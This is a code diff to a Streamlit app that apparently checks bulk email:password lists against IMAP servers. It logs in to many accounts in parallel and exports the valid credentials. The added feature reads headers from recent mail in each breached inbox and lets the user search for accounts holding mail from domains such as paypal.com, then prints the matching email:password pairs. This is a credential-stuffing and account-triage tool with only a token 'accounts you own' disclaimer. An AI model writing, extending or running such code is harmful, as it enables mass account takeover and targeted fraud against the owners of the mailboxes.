@@ -21,7 +21,7 @@ if not st.session_state.authenticated:
     st.stop()
 
 # ==================================================
-# 📧 IMAP CHECKER — Inbox Counts + Domain Stats + 2FA/Unknown
+# 📧 IMAP CHECKER — Inbox Counts + DOMAIN SEARCH IN INBOX + 2FA + Stats
 # ==================================================
 
 import imaplib
@@ -36,6 +36,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 MAX_WORKERS = 8
 TIMEOUT = 15
 DELAY_BETWEEN = 0.1
+MAX_SCAN_EMAILS = 50  # Scan up to 50 most recent emails for domains
 
 # 🔍 PARSE LINE
 def parse_line(line):
@@ -68,12 +69,52 @@ def get_imap_server(email):
     }
     return servers.get(domain, ("imap." + domain, 993))
 
-# 📊 EXTRACT DOMAIN
-def get_domain(email):
+# 📊 EXTRACT DOMAIN FROM EMAIL ADDRESS
+def extract_domain(email_str):
+    """Extract domain from email-like strings"""
+    match = re.search(r'@([a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', str(email_str))
+    return match.group(1).lower() if match else None
+
+# 🔎 SCAN INBOX FOR ALL DOMAINS
+def scan_inbox_domains(mail, max_emails=MAX_SCAN_EMAILS):
+    """Scan recent emails and count all unique sender/recipient domains"""
+    domains = Counter()
     try:
-        return email.split("@")[-1].lower()
+        status, count = mail.select("INBOX", readonly=True)
+        if status != "OK":
+            return domains
+        
+        total = int(count[0])
+        if total == 0:
+            return domains
+        
+        # Get last N emails (newest first)
+        fetch_count = min(total, max_emails)
+        status, data = mail.search(None, "ALL")
+        if status != "OK":
+            return domains
+        
+        id_list = data[0].split()[-fetch_count:]
+        for email_id in id_list:
+            try:
+                # Fetch FROM, TO, CC headers only (fast!)
+                status, msg_data = mail.fetch(email_id, "(BODY[HEADER.FIELDS (FROM TO CC)])")
+                if status != "OK":
+                    continue
+                for response_part in msg_data:
+                    if isinstance(response_part, tuple):
+                        headers = response_part[1].decode("utf-8", errors="ignore")
+                        # Extract ALL emails from headers
+                        emails_found = re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', headers)
+                        for e in emails_found:
+                            dom = extract_domain(e)
+                            if dom:
+                                domains[dom] += 1
+            except:
+                continue
     except:
-        return "unknown"
+        pass
+    return domains
 
 # 🔎 CHECK FOR 2FA / LOCKED / UNKNOWN
 def check_special_status(exception_msg, email):
@@ -86,12 +127,12 @@ def check_special_status(exception_msg, email):
         return "⏳ Rate Limited"
     return None
 
-# 📧 MAIN IMAP CHECK
+# 📧 MAIN IMAP CHECK — WITH INBOX DOMAIN SCAN
 def check_imap(account):
     email = account["email"]
     password = account["password"]
     host, port = get_imap_server(email)
-    domain = get_domain(email)
+    domain = extract_domain(email) or "unknown"
     
     result = {
         "email": email,
@@ -100,6 +141,8 @@ def check_imap(account):
         "status": "UNKNOWN",
         "note": "",
         "inbox_count": 0,
+        "inbox_domains": {},  # ← ALL DOMAIN HITS IN INBOX
+        "top_domains": "",    # ← Top 5 for display
         "imap_server": host,
         "checked_at": time.strftime("%Y-%m-%d %H:%M:%S")
     }
@@ -113,9 +156,16 @@ def check_imap(account):
         if status == "OK":
             result["inbox_count"] = int(count[0])
         
+        # 🔍 SCAN INBOX FOR DOMAIN HITS
+        result["inbox_domains"] = scan_inbox_domains(mail, MAX_SCAN_EMAILS)
+        
+        # Format top 5 domains for display & export
+        top5 = sorted(result["inbox_domains"].items(), key=lambda x: x[1], reverse=True)[:5]
+        result["top_domains"] = ", ".join([f"{d}({c})" for d, c in top5])
+        
         mail.logout()
         result["status"] = "✅ VALID"
-        result["note"] = f"✅ {result['inbox_count']} emails in inbox"
+        result["note"] = f"✅ {result['inbox_count']} emails | Scanned {MAX_SCAN_EMAILS} for domains"
 
     except imaplib.IMAP4.error as e:
         special = check_special_status(e, email)
@@ -141,11 +191,13 @@ def check_imap(account):
     return result
 
 # --- PAGE SETUP ---
-st.set_page_config(page_title="📧 IMAP Checker — Full Stats", layout="wide")
-st.title("📧 IMAP Account Checker — Inbox Counts + Domain Stats + 2FA Capture")
-st.markdown("""
+st.set_page_config(page_title="📧 IMAP Checker — Inbox Domain Search", layout="wide")
+st.title("📧 IMAP Account Checker — Inbox Counts + INBOX DOMAIN SEARCH + 2FA + Stats")
+st.markdown(f"""
 **Format**: `email:password` — one per line.  
-**Captures**: ✅ Valid (with inbox count) | 🔒 2FA/Security | ❌ Invalid | ❓ Unknown | ⏱️ Timeout
+**New**: Scans inbox for **all domains** found in emails! Shows top domains per account + overall domain hits.  
+**Captures**: ✅ Valid (inbox count + domains) | 🔒 2FA/Security | ❌ Invalid | ❓ Unknown | ⏱️ Timeout  
+*Scans up to **{MAX_SCAN_EMAILS}** most recent emails per account — adjustable in code.*
 """)
 st.info("⚠️ For accounts YOU own only. UK Computer Misuse Act applies.")
 
@@ -201,9 +253,10 @@ if start_btn:
         st.stop()
 
     total = len(accounts)
-    st.info(f"🔍 Starting check of **{total}** accounts...")
+    st.info(f"🔍 Starting check of **{total}** accounts... Scanning inboxes for domains!")
 
     results_data = []
+    all_inbox_domains = Counter()  # ← GLOBAL: ALL domains across ALL inboxes
     start_time = time.time()
 
     progress_bar = st.progress(0)
@@ -215,7 +268,9 @@ if start_btn:
 
         for idx, result in enumerate(results):
             results_data.append(result)
-            progress_bar.progress((idx + 1) / total)
+            # Aggregate ALL inbox domains across valid accounts
+            if "✅ VALID" in result["status"] and result.get("inbox_domains"):
+                all_inbox_domains.update(result["inbox_domains"])
             
             # Live counters
             valid_count = sum(1 for r in results_data if "✅ VALID" in r["status"])
@@ -223,6 +278,7 @@ if start_btn:
             inv_count = sum(1 for r in results_data if "❌ INVALID" in r["status"] or "❌ FAILED" in r["status"])
             unk_count = sum(1 for r in results_data if "❓ UNKNOWN" in r["status"] or "⏱️" in r["status"])
             
+            progress_bar.progress((idx + 1) / total)
             t_m.metric("Total", idx + 1)
             v_m.metric("✅ Valid", valid_count)
             fa_m.metric("🔒 2FA/Sec", fa_count)
@@ -233,8 +289,8 @@ if start_btn:
     elapsed = round(time.time() - start_time, 1)
     st.success(f"✅ CHECK COMPLETE — {total} accounts in {elapsed}s")
 
-    # --- 📊 DOMAIN BREAKDOWN ---
-    st.subheader("📈 Domain Breakdown")
+    # --- 📊 OVERALL ACCOUNT DOMAIN BREAKDOWN ---
+    st.subheader("📈 Account Domain Breakdown")
     domain_counts = Counter(r["domain"] for r in results_data)
     domain_valid = Counter(r["domain"] for r in results_data if "✅ VALID" in r["status"])
     
@@ -247,34 +303,65 @@ if start_btn:
         }
         for domain, count in sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)
     ]
-    
     st.dataframe(domain_table, use_container_width=True, hide_index=True)
 
+    # --- 🔍 INBOX DOMAIN SEARCH — BIG NEW FEATURE! ---
+    st.subheader("🔍 ALL DOMAINS FOUND IN INBOXES")
+    if all_inbox_domains:
+        st.info(f"Found **{len(all_inbox_domains)} unique domains** across all scanned inboxes!")
+        
+        # Top 20 overall inbox domains
+        top_overall = sorted(all_inbox_domains.items(), key=lambda x: x[1], reverse=True)[:20]
+        inbox_domain_table = [
+            {"Domain": domain, "Times Found in Emails": count}
+            for domain, count in top_overall
+        ]
+        st.dataframe(inbox_domain_table, use_container_width=True, hide_index=True)
+        
+        # Search filter
+        search_domain = st.text_input("🔍 Search for a specific domain in all inboxes", placeholder="e.g. paypal.com, amazon.co.uk...").strip().lower()
+        if search_domain:
+            st.subheader(f"🔎 Results for: `{search_domain}`")
+            matches = [
+                r for r in results_data
+                if "✅ VALID" in r["status"] and search_domain in r.get("inbox_domains", {})
+            ]
+            if matches:
+                st.success(f"Found in **{len(matches)} accounts**!")
+                for m in matches:
+                    st.code(f"{m['email']}:{m['password']} | 📥 {m['inbox_domains'][search_domain]} emails contain @{search_domain}")
+            else:
+                st.warning(f"No accounts found with `{search_domain}` in scanned inboxes.")
+    else:
+        st.info("ℹ️ No inbox domains scanned — no valid accounts with accessible inboxes.")
+
     # --- 📋 FULL RESULTS TABLE ---
-    st.subheader("📋 All Results — Full Details")
+    st.subheader("📋 All Results — Per Account Details")
     st.dataframe(
         results_data,
         column_config={
             "email": "Email",
             "password": "Password",
-            "domain": "Domain",
+            "domain": "Account Domain",
             "status": "Status",
             "note": "Details",
-            "inbox_count": "📥 Inbox Emails",
+            "inbox_count": "📥 Total Emails",
+            "top_domains": "🔍 Top Inbox Domains",
             "imap_server": "IMAP Server",
             "checked_at": "Checked At"
         },
         use_container_width=True,
-        height=500
+        height=500,
+        column_order=["email","password","domain","status","note","inbox_count","top_domains","imap_server","checked_at"]
     )
 
     # --- 📥 EXPORT ALL FORMATS ---
     st.subheader("📥 Export Results — All Formats")
     col_a, col_b, col_c, col_d, col_e = st.columns(5)
 
-    # 1. FULL CSV
+    # 1. FULL CSV — includes inbox domains!
     csv_full = StringIO()
-    writer = csv.DictWriter(csv_full, fieldnames=["email","password","domain","status","note","inbox_count","imap_server","checked_at"])
+    writer = csv.DictWriter(csv_full, fieldnames=["email","password","domain","status","note","inbox_count","top_domains","imap_server","checked_at"])
     writer.writeheader()
     writer.writerows(results_data)
     col_a.download_button(
@@ -285,13 +372,13 @@ if start_btn:
         type="primary"
     )
 
-    # 2. ✅ VALID ONLY — with inbox count
+    # 2. ✅ VALID ONLY — with inbox count + top domains
     valid_lines = [
-        f"{r['email']}:{r['password']} | 📥 Inbox: {r['inbox_count']} emails | {r['domain']}"
+        f"{r['email']}:{r['password']} | 📥 Inbox: {r['inbox_count']} emails | 🔍 Domains: {r['top_domains']} | {r['domain']}"
         for r in results_data if "✅ VALID" in r["status"]
     ]
     col_b.download_button(
-        "✅ Valid + Inbox Count",
+        "✅ Valid + Inbox Domains",
         data="\n".join(valid_lines),
         file_name=f"imap_valid_{time.strftime('%Y%m%d_%H%M%S')}.txt",
         type="secondary"
